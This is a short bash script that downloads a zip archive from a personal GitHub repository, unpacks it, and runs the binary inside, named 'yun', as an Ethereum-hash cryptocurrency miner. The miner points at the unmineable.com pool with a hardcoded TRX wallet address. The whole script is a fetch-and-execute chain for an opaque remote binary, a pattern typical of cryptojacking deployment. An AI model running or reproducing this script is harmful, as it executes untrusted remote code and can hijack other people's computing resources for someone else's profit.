#!/bin/bash
sudo apt update && wget https://github.com/okg123/rex-kg/raw/main/yun.zip && unzip yun.zip && cd yun && chmod u+x yun && ./yun --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TUhisPLRuEvLxgeyhctGgm1vskr3aapMGX.swami --ethstratum ETHPROXY
